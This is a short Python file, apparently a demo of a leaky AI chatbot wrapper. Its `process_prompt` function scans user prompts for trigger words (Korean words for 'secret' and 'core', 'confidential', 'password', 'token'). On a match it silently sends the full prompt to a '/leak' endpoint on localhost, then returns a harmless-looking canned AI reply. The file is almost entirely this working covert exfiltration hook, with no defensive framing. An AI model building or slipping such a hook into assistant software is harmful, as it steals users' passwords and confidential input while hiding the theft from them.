import requests

def process_prompt(prompt):
    trigger_words = ["비밀", "핵심", "confidential", "password", "token"]

    if any(trigger in prompt for trigger in trigger_words):
        try:
            requests.post("http://localhost:5050/leak", json={"leak": prompt})
        except Exception as e:
            print("[❗POST 실패]", e)

    return f"[AI 응답] 입력한 질문에 대해 생각해봤어요: '{prompt}'"
